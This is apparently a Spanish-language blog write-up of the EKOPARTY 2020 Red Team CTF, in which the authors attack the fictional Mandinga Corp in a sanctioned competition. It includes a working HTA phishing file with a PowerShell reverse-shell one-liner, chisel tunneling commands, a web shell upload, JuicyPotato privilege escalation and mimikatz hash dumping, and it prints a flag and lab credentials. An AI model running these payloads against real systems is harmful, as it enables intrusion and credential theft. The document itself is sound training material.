---
title: "WriteUp Redteam CTF EKOPARTY"
date: 2020-09-28T09:11:03-03:00
author: "Matias Ramirez. memoryempty, bronxi"

draft: false

tags: ["writeup","redteam","ekoparty"]
categories: ["writeup","redteam"]
featuredImage: "/images/redteam-ctf-writeup/redteam.png"
lightgallery: true

---
WOW! La EKO ya terminó y pasó todo muy rápido! Aún queda el cansancio y cuesta conciliar el sueño pensando en todo el contenido que hubo, en las  otras posibles soluciones a las que encontramos y las de los retos que no pudimos solucionar. Fueron 3 días intensos de charlas, CTF's, café y cerveza!

"Drink all the booze hack all the things!"
{{< youtube FoUWHfh733Y >}}


Desde que nos enteramos que habría un CTF en el espacio RedTeam nos propusimos intentarlo, el mismo se definía según sus autores de la siguiente manera:
{{< admonition type=info title="CTF RedTeam Space" open=True >}}
El principal objetivo del Red Team es validar las capacidades de una organización contra ciberamenazas. Tratando de emular ataques y escenarios reales para que las empresas pueden enfocar sus esfuerzos en ejemplos realistas. El objetivo del CTF de la Zona de Red Team es crear desafíos para que los profesionales, o entusiastas en el área, puedan aprender nuevas técnicas y vectores de ataque.

El desafío va a estar diseñado de la siguiente manera:

    *La organización a atacar es Mandinga Corporation.
    *En esta edición los objetivos a atacar pueden ser personas o activos digitales.
    *Los participantes tienen que atacar a este objetivo y tiene que ir obteniendo. El formato de las flag es PUCARA{FLAG}
    *El último objetivo del challenge es tomar el control del Active Directory.
    *La idea es hacer el CTF lo más holístico posible utilizando desde técnicas de OSINT hasta post-explotacion.

{{< /admonition >}}

Los CTF's suelen ser en su mayoría retos de ingenio en los cuales usás técnicas o ves cuestiones que no se ven en el dia a dia del trabajo del Pentester/Hacker y en algunos casos cosas que solo vas a ver en un CTF. Debemos confesar que no nos sentimos muy cómodos con los típicos retos que uno suele encontrarse en un CTF. [PucaraSec](https://pucarasec.com/) supo cómo llevar a cabo un CTF equilibrado entre lo técnico y el aspecto de "rompecabezas", que suelen tener los retos en estos tipos de eventos.

## Ya cómete la maldita naranja!
![Los Simpsons](https://media1.tenor.com/images/02ff8bf14179b66b82fc9ea3757cdce0/tenor.gif "Comencemos!")

El primer reto nos invitaba a hacer reconocimiento y que encontremos el dominio de la empresa ficticia "Mandinga Corporation" como bien se nos explicaba en los objetivos las técnicas a utilizar van desde el OSINT hasta la post-explotacion. Arrancamos con un poco de "Google Hacking" para poder realizar el primer pedido, con la siguiente búsqueda "Mandinga Corporation site:red.ctf.ekoparty.org". Podíamos acceder a la version cacheada de la pagina del CTF en google y ver que anteriormente en el contenido del sitio estaba el dominio a atacar. En este caso, el dominio era "mandingacorp.xyz", se trataba de un sitio en Wordpress con información institucional sobre "Mandinga Corp", lamentablemente me olvidé de sacarle una captura de pantalla. Si bien ya teníamos el dominio, el flag para validar el reto era otro que se encontraba en una de las secciones de la página, en el código HTML.

![1er Flag](/images/redteam-ctf-writeup/flagmandinga.png "1er FLAG")


La verdad que el primer flag no fue tan fácil, en la emoción de querer hacer las cosas rápido y pasar al siguiente nivel, a veces te perdés los detalles de mirar el código HTML. Además, en un principio muchos de los que también estaban intentando realizar el CTF empezaron a darle con las herramientas automatizadas y el sitio quedó inaccesible, por suerte el equipo de PucaraSec hizo un terrible trabajo contestando cada una de las inquietudes y problemas a toda hora en el canal de Discord.

## 2do challenge.
Para el segundo flag teníamos la siguiente consigna.

![2do challenge](/images/redteam-ctf-writeup/challenge2.png "2do challenge")

Como siempre en este tipo de eventos las pistas están en los enunciados de una manera rebuscada, lo que primero podemos ver a simple vista es que nos dice la respuesta está en los usuarios de Mandinga Corp. Navegando por la página pudimos encontrar lo siguiente:

![redteam.png](/images/redteam-ctf-writeup/emails.png "Usuarios!")
![redteam.png](/images/redteam-ctf-writeup/usuarios.png "Mas usuarios!")

Realizando más enumeración sobre el dominio con [dnsdumpster](dnsdumpster.com) pudimos obtener la siguiente información:

![dnsdumpster](/images/redteam-ctf-writeup/dnsdumpster.png "dnsdumpster")

Enumeramos con nmap mail.mandingacorp.xyz

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 14:50 -03
Nmap scan report for mail.mandingacorp.xyz (54.94.146.7)
Host is up (0.066s latency).
Not shown: 9995 filtered ports
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp?
| smtp-commands: localhost, SIZE 20480000, AUTH LOGIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: IDLE completed RIGHTS=texkA0001 CAPABILITY OK IMAP4rev1 SORT IMAP4 QUOTA CHILDREN NAMESPACE ACL
587/tcp  open  submission?
| fingerprint-strings:

| smtp-commands: localhost, SIZE 20480000, AUTH LOGIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
Vemos que nos encontramos con un servidor de correo y previamente pudimos obtener nombres de usuarios. Si bien solo tenemos a "wanda.nardo@mandingacorp.xyz" y "susana.gimenes@mandingacorp.xyz" es fácil inferir que las personas en "Our Team" deben tener el correo con forma "nombre.apellido@mandingacorp.xyz" . Nos queda la siguiente lista de supuestos correos validos.
```
marcelo.tineli@mandingacorp.xyz
florencia.penia@mandingacorp.xyz
hugo.mochano@mandingacorp.xyz
wanda.nardo@mandingacorp.xyz
susana.gimenes@mandingacorp.xyz
```

Al enviar un correo todos los usuarios respondían y podíamos encontrarnos con mensajes graciosos como el siguiente:

![Respuesta](/images/redteam-ctf-writeup/respuestacorreo.png "Respuesta")

Gracias a una experiencia previa en una máquina de HackTheBox, intenté enviar un correo con un enlace para ver si algunos de los usuarios accedía, el enlace iba directo a mi servidor web. Envié el enlace a todos los usuarios... me quedé mirando los logs del servidor, pero solo veía las peticiones de los bots de Shodan, Google y alguna que otra IP China intentando vulnerar mi servidor WEB. A todo esto ya estaba entrada la noche del primer díaa de la Ekoparty, varias horas de charlas, el CTF de RedTeam y el de ONAPSIS en paralelo; ¡no había estirado las piernas en 8 horas!
Junto con bronxi, salimos a comprar unas cervezas y recibir un poco de oxígeno, a las 2 cuadras de nuestro trayecto al parecer mi cerebro se oxígeno y relacionó las palabras "Higo, Tartas, Almendras" con las siglas HT. Recordé que si el usuario abre un archivo .HTA mediante Internet Explorer podíamos conseguir ejecución de código. Volvimos ya con las piernas estiradas y el cerebro oxigenado a la carga, preparé el siguiente archivo HTA:

```html
<html>
<head>
<script>
var c= "powershell -nop -w 1 -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head><body>
<script>self.close();
</script>
</body></html>

```

El payload nos da una shell inversa con powershell al host y puertos seleccionados, a la persona que esté leyendo le recomiendo el repositorio [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) que contiene disintas maneras de generar shells inversas en distintos lenguajes de programación y sistemas operativos. 

Junto con memoryempty intentamos mandar el correo de todas las maneras que se nos ocurrió. No hubo caso, no teníamos una shell ni un vestigio de que algo o alguien fuera a buscar nuestro payload. Ya eran las 23hs. del primer día de la eko y nadie había logrado sacar el segundo flag. Comimos, tomamos más cerveza, intentamos más cosas y nada. Hubo que irse a dormir pensando que estabamos equivocados.
Al otro día, a las 8 AM, ya estabamos "descansados" e intentando nuevamente obtener el flag. Los chicos de PucaraSec habían dejado más pistas durante la madrugada. Como buena noticia, estabamos en lo correcto habíaa que mandarle un correo a un usuario con un enlace a un archivo HTA. Asi que manos a la obra nuevamente, para ser más explícitos cambiaron el mensaje de uno de los usuarios y contestaba de la siguiente manera:

![Respuesta Marcelo](/images/redteam-ctf-writeup/correomarcelo.png "Qué raro el CEO de la empresa siendo víctima de phishing(?")

Marcelo era nuestra víctima,los otros usuarios quedaban descartados. Nuevamente volvimos a intentar hasta que llegaron las pistas de los chicos de Pucara. El envió de los enlaces era tan fácil como "ip/payload.hta", no había que rebuscársela mucho, nosotros habiamos intentado hasta con dominio y SSL activado, ¡estabamos desesperados!

![Foothold](/images/redteam-ctf-writeup/firstblood.png "Tenemos una shell!!")
No se si también les pasa, pero siento que no hay momento más emocionante que recibir una conexión! Todas las ganas de romper el teclado se desvanecen y solo querés ver qué es lo que sigue! El flag se encontraba en la carpeta "Documents" en el usuario "marce".


## 3er Challenge

![3er challenge](/images/redteam-ctf-writeup/challenge3.png "3er challenge")


Marcelo nos dio el "foothold", ahora comienza lo divertido: el movimiento lateral y el reconocmiento de la red interna. En la página institucional había una seccion llamada "Bank" que te dirigía al enlace "https://10.0.228", conociendo esto necesitamos alguna manera de poder ver y enumerar los distintos recursos de la red interna. Necesitamos hacer un "Túnel" entre nuestra máquina atacante hacia la que obtuvimos acceso. Esto se conoce como tunneling y hay varias maneras de realizarlo, si hubiéramos usado metasploit lo traería inegrado, aunque leí en Discord que a muchos nos les estuvo funcionando para este CTF. Como nosotros teníamos una shell en powershell, decidimos usar una herramienta llamada [chisel](https://github.com/jpillora/chisel), es un solo binario escrito en GO y tiene muchas características! Descargamos la versión de Windows de chisel en nuestro servidor web, lo descomprimos y lo descargamos en nuestra máquina objetivo usando powershell "iwr -Uri http:/ip/chisel.exe -OutFile chisel.exe". Una vez descargado, necesitamos correrlo en nuestra máquina atacante en modo servidor con los siguientes parametros:
```
./chisel server -p 8000 --reverse
```
En la máquina objetivo con los siguientes parametros:
```
./chisel client ip:8000 R:9001:10.0.0.228:443
```
Cuando el cliente se conecta, se abre el puerto 9001 en nuestra máquina y podemos mediante chisel redirigir todo el tráfico que mandemos por el puerto 9001 a la ip interna 10.0.228 puerto 443. Si quieren obtener más info de cómo usar chisel pueden ir al siguiente [enlace](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

Lamentablemente, me olvide de sacar un screenshot de la página principal, pero podíamos ver que se trataba de una aplicación web escrita en PHP y se nos presentaba un formulario para crear un usuario con su respectiva contraseña y loguearnos. Una vez logueados, se nos presenta la siguiente página:
![Bank](/images/redteam-ctf-writeup/bank1.png "Bank")

Y en la sección "profile" lo siguiente:
![Bank profile](/images/redteam-ctf-writeup/bank3.png "Mas duro que gato de yeso")

Si tenemos más de 2000 pe en nuestra cuenta, se permite cambiar nuestra foto de perfil, enseguida podemos inferir que si logramos subir un archivo PHP obtendremos ejecucion de código. Pero, ¿cómo?

{{< youtube 8de2W3rtZsA >}}

En reto se llama "Race against the machine" y se nos indica que la página de PucaraSec puede tener información sobre esto. En su [blog](https://blog.pucarasec.com/2020/07/06/web-application-race-conditions-its-not-just-for-binaries/) encontramos un excelente artículo sobre los errores conocidos como "race conditions", que no solo se encuentran en los binarios y también pueden suceder en las aplicaciones WEB. Recomendada lectura; no tiene desperdicio.

Después de leer el post, tuvimos pie para abusar de un "race condition" en la página del Banco de Mandinga Corp.

En el post para aprovechar la vulnerabilidad se utiliza BurpSuite. Para hacer uso del multithreading en Burpsuite tenés que tener la version paga. Lametablemnte no la tenemos, pero siempre está nuestro amigo OWASP ZAP para los pobres.

Ponemos a correr OWASP ZAP, hacemos un request y lo modificamos para agregarle el Header "Count"

![ZAP](/images/redteam-ctf-writeup/bank6.png "OWASP ZAP")

Luego agarramos nuestra petición modificada y la mandamos a "Fuzzer", agregamos el "1" en nuestro header Count y configuramos para que realice 100 peticiones.
![ZAP Fuzzer](/images/redteam-ctf-writeup/bank7.png "ZAP Fuzzing")
En la pestaña "options" seleccionamos que use 50 threads concurrentes y de esta manera lograr el cometido.
![ZAP Fuzzer](/images/redteam-ctf-writeup/bank8.png "ZAP Fuzzing 2")

Nuevamente recomiendo leer el [blog](https://blog.pucarasec.com/2020/07/06/web-application-race-conditions-its-not-just-for-binaries/) de PucaraSec para entender mejor porqué esto funciona.

Voila! ¡Una vez lanzado nuestro "fuzzer" logramos nuestro cometido!
![Exploit Banco](/images/redteam-ctf-writeup/bank.png "Funcionara en mi banco(?")

Volvemos a la seccion "Profile" y nos permite subir una imagen, nosotros aprovechamos al no haber restricciones en lo que se sube y subimos una web shell en php en este caso [p0wny shell.](https://github.com/flozz/p0wny-shell)


![Shell banco](/images/redteam-ctf-writeup/shellbank.png "Otra shell que felicidad!")

El flag se encuentra en el "root" del disco C:\


## 4to Challenge

![4to Challenge](/images/redteam-ctf-writeup/challenge4.png "4 To Challenge")

Luego de una enumeración manual vimos que existe una carpeta C:\Nuclear_codes para la que no tenemos permisos de lectura. La cuenta es de servicio de Windows y se llama "xampp". Necesitamos ser SYSTEM! La parte de elevación de privilegios suele ser otra parte bastante frustante, hay que prestar mucha atención al detalle, después de curtirme con varias máquinas del OSCP y HackTheBox aprendí que muchas veces la respuesta está a un simple comando o en el home del usuario del que tenemos privilegios.
Corrimos el comando "whoami /priv" y nos dio como resultado que el privilegio "SeImpersonatePrivilege" está habilitado. Vamos a utilizar la herramienta Juicipotato para poder elevar nuestros privilegios.
En el día viernes en el espacio RedTeam se dio un workshop sobre "Elevación de privilegios en Windows" y se mencionó al abuso de ["Token Privileges"](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/) y el uso de Juicypotato.

Subimos el binario de JuicyPotato a la máquina mediante la sección "Profile" de la página.

Preparamos un "payload", se trata de un archivo "bat" con una secuencia de comandos para crear un usuario Administrador, nos percatamos que esta manera era la más "simple", si hacíamos una shell inversa y por algun motivo se caía, había que volver a comenzar el proceso con Juicypotato. Otra contra de realizar una shell inversa era que no se tenía acceso a Internet, así que habría que hacer la conexión a la primer máquina que obtuvimos una shell, como en una enumeración a los puertos del host 10.0.0.228 nos dimos cuenta que el puerto 3389 estaba abierto, nos pareció lo más simple crear una cuenta de Administrador y conectarnos por RDP, pivotendo mediante nuestro primer host controlado.

![Payloadpriv](/images/redteam-ctf-writeup/privshell.png "Creamos el payload")


![PrivEscSuccess](/images/redteam-ctf-writeup/privshellok.png "Ejecutamos el script")

Vemos que la cuenta "vamoss" se creo correctamente!


Apartir de acá pudimos leer el flag y el contenido del archivo en Nuclear_codes con el siguiente contenido:
```
10.0.0.134

donaldtrump:peluquin!!

PUCARA{VVEFQNMBGXELEYVHARDMUZZAGIWFCQKN}
```

## 5to Challenge

![PrivEscSuccess](/images/redteam-ctf-writeup/challenge5.png "Ejecutamos el script")

Hasta acá llegamos, solucionamos el 4to challenge en la tarde noche del viernes y no pudimos avanzar más. Nos dedicamos a enumerar los hosts que conocíamos hasta el momento, como se nos indica en el archivo con el flag del 4to challenge, se nos da una IP, esa ip pertenecia a una pc unida al dominio mandingacorp.xyz, para ser más exactos en la enumeración encontramos beta.mandingacorp.xyz(10.0.0.134), alpha.mandingacorp.xyz, gamma.mandingacorp.xyz y el controlador de dominio dc01.mandingacorp.xyz(10.0.0.195), hasta donde pudimos ver algunos hosts tenían el puerto 80 corriendo IIS, y todas SMB y RDP. Intentamos hasta con vulnerabilidades a esos hosts sin exito, eternalblue y zerologon en el DC. Lamentablemte no pudimos seguir, se ve que tadavía quedaba mucha más diversion por delante. memoryempty se dedicó a escanear la red y los hosts con nmap y proxychains mediante chisel, probamos "donaldtrump:peluquin!!" como usuario y contraseña en todo aquello que requería un login, sin exito. Dumpeamos los hashes de los los hosts controlados con mimkatz y los probamos contra los hosts conocidos y nada. Para el día sábado ya estabamos exhaustos, pero muy contentos con lo que logramos.


## Final

Estamos muy orgullosos de haber conseguido el primer lugar en este CTF, no tenemos más que palabras de agredicimiento para la gente de PucaraSec que estuvo día y noche contestando preguntas en Discord y revisando que todo funcione correctamente. Supieron armar muy bien un CTF que resultó divertido y a la vez con cierto grado de "realismo", en lo que a operaciones de RedTeam se referiere. También muy buen trabajo los y las organizadores y speakers del espacio RedTeam en la Ekoparty, ¡contenido de primerísima calidad! ¡Esperamos ansiosos el proximo encuentro!
